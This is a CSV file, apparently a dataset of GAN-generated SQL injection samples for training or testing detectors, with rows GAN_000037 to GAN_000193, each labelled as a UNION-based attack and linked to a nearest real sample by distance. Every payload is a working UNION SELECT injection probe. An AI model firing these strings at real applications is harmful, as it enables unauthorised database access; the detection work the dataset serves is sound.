id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000037,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,5.075466172343709
GAN_000038,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001509,3.141779137937736
GAN_000039,attack,union,"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--",nearest_attack_euclidean,R000585,4.660105236906051
GAN_000040,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,3.5104307520660867
GAN_000041,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,3.491016329501393
GAN_000042,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,6.849562041641451
GAN_000043,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.117425755185578
GAN_000044,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R001308,9.066979245071105
GAN_000045,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000269,5.153843852224034
GAN_000046,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,3.4167322021976387
GAN_000047,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,3.4638229644171195
GAN_000048,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001205,4.271488517797595
GAN_000049,attack,union,"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000618,4.258291772237064
GAN_000050,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001263,4.834968360601778
GAN_000051,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,7.438527418582238
GAN_000052,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000742,7.099158768408997
GAN_000053,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000489,5.942770758515213
GAN_000054,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000924,4.470257890062729
GAN_000055,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000307,3.4168612471868367
GAN_000056,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001509,3.529818580789893
GAN_000057,attack,union,"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000618,4.421129432503506
GAN_000058,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001269,6.143721812368151
GAN_000059,attack,union,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000207,4.631094698520468
GAN_000060,attack,union,"1%'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001248,5.474206021972606
GAN_000061,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,8.136904819072614
GAN_000062,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,5.425656478406916
GAN_000063,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,3.5396607876165516
GAN_000064,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000293,11.654317527183697
GAN_000065,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,3.4690759661955073
GAN_000066,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,5.14981884268471
GAN_000067,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.965985714841827
GAN_000068,attack,union,"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000618,3.7623480952960744
GAN_000069,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.570849277634787
GAN_000070,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.622082666492383
GAN_000071,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,5.758837154477471
GAN_000072,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001205,3.716093376546165
GAN_000073,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,4.494608448111559
GAN_000074,attack,union,"1'||  (  select 'ybfo' from dual where 3319  =  3319 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000889,6.822062565039006
GAN_000075,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,4.256006653640718
GAN_000076,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,3.9077973921632823
GAN_000077,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R001238,5.292614364397995
GAN_000078,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,4.208325350372614
GAN_000079,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,3.5541433066134402
GAN_000080,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,3.727185492668363
GAN_000081,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,4.249423581937966
GAN_000082,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,6.753074076178347
GAN_000083,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000924,4.5532290081172295
GAN_000084,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.423531601207235
GAN_000085,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.283255615632948
GAN_000086,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000924,4.267514476610361
GAN_000087,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000658,4.330672192216121
GAN_000088,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000744,5.673806358899001
GAN_000089,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000924,3.352426072808881
GAN_000090,attack,union,"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000618,4.890279828160708
GAN_000091,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,5.074458138731207
GAN_000092,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000924,3.5285824308145775
GAN_000093,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001263,5.207785914419605
GAN_000094,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000319,3.9736288741903434
GAN_000095,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000890,4.579813610744312
GAN_000096,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000658,4.587151747221065
GAN_000097,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.823610797324653
GAN_000098,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001263,4.517389282558183
GAN_000099,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,3.7287455607821096
GAN_000100,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,4.324685506849612
GAN_000101,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000690,7.474456584198859
GAN_000102,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000473,4.534116412265537
GAN_000103,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.066742347987354
GAN_000104,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,5.579465140323697
GAN_000105,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000658,4.345522718211359
GAN_000106,attack,union,"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000618,4.30530439404992
GAN_000107,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R000953,4.1093551542724684
GAN_000108,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000690,8.473334571692863
GAN_000109,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R001238,6.305243564846297
GAN_000110,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001205,3.773748822095603
GAN_000111,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000319,4.116115389730866
GAN_000112,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000658,4.005511477318894
GAN_000113,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R001238,4.576623212004373
GAN_000114,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,7.379537559517913
GAN_000115,attack,union,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000207,4.495939383185132
GAN_000116,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000890,5.317316253407945
GAN_000117,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,5.047298863761512
GAN_000118,attack,union,"1'  )   as ybuv where 9641  =  9641 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000583,4.889100979504982
GAN_000119,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,5.596828575612324
GAN_000120,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,5.146855568396551
GAN_000121,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.519011073103928
GAN_000122,attack,union,"1'  )   as ghks where 5128  =  5128 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000493,6.090709923457811
GAN_000123,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,4.757659066786926
GAN_000124,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000373,3.7472077724891215
GAN_000125,attack,union,"-2247'  )   union all select 1202,1202,1202,1202,1202#",nearest_attack_euclidean,R000953,5.176760977547062
GAN_000126,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,6.179589488121414
GAN_000127,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,4.340242782787692
GAN_000128,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,4.405954545950666
GAN_000129,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001205,3.7936794133525082
GAN_000130,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001205,4.289141116923761
GAN_000131,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000489,5.408379003896321
GAN_000132,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000269,5.25113190066656
GAN_000133,attack,union,"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000618,4.401680459803895
GAN_000134,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000744,6.251566510579639
GAN_000135,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001269,3.905050949908388
GAN_000136,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001205,3.90156864183036
GAN_000137,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000658,3.6926422016056573
GAN_000138,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,4.3053316693457395
GAN_000139,attack,union,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000207,5.735080591606506
GAN_000140,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000307,3.3424951306137873
GAN_000141,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001263,5.631592475724898
GAN_000142,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R001238,5.624325850407041
GAN_000143,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,3.6889068211409497
GAN_000144,attack,union,"1'  )   where 6988  =  6988 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001162,4.905163164178185
GAN_000145,attack,union,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000307,4.377601304313801
GAN_000146,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,3.2154741609977258
GAN_000147,attack,union,"1'||  (  select 'ybfo' from dual where 3319  =  3319 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000889,7.0699991774508915
GAN_000148,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000924,4.060879521566725
GAN_000149,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001263,4.519171406480315
GAN_000150,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.055144765352015
GAN_000151,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,6.539507308773819
GAN_000152,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,4.582934346446461
GAN_000153,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000744,6.053000891327857
GAN_000154,attack,union,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000373,3.705403827980568
GAN_000155,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,3.5180686178391345
GAN_000156,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R001308,6.95623718511142
GAN_000157,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,4.273059111736281
GAN_000158,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000817,4.075421594184802
GAN_000159,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001509,3.4662806917022673
GAN_000160,attack,union,"1'  )   as pfwt where 8448  =  8448 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000599,5.276084191444179
GAN_000161,attack,union,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000489,5.590675858977487
GAN_000162,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,6.560263939080027
GAN_000163,attack,union,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",nearest_attack_euclidean,R001238,8.170956246087632
GAN_000164,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,3.9290724752718615
GAN_000165,attack,union,"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000618,4.375665396838754
GAN_000166,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000269,4.659418846302254
GAN_000167,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,5.20703083291383
GAN_000168,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001263,4.521787961767107
GAN_000169,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,6.561065387773363
GAN_000170,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,7.432069692576247
GAN_000171,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,6.1875951953134685
GAN_000172,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.811462913526897
GAN_000173,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001205,4.951967154545806
GAN_000174,attack,union,"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000618,4.633921499196778
GAN_000175,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000890,3.7191434945046544
GAN_000176,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,3.7076837865603602
GAN_000177,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,3.1559767769999745
GAN_000178,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,4.373992968626428
GAN_000179,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000748,4.1935259973862795
GAN_000180,attack,union,"1%'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001248,5.760741896274731
GAN_000181,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001205,4.193385012701439
GAN_000182,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,5.010965153851476
GAN_000183,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R001308,7.637349613170399
GAN_000184,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R001269,4.765000905576615
GAN_000185,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,7.8526642290897035
GAN_000186,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R001310,4.331840003579322
GAN_000187,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000852,5.794484166400741
GAN_000188,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R001308,8.708724471523302
GAN_000189,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,3.9298321396816833
GAN_000190,attack,union,"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--",nearest_attack_euclidean,R000585,4.509709516598252
GAN_000191,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001481,5.537125259625154
GAN_000192,attack,union,"1%'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001248,4.951570412992667
GAN_000193,attack,union,"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000618,3.9299471335906473
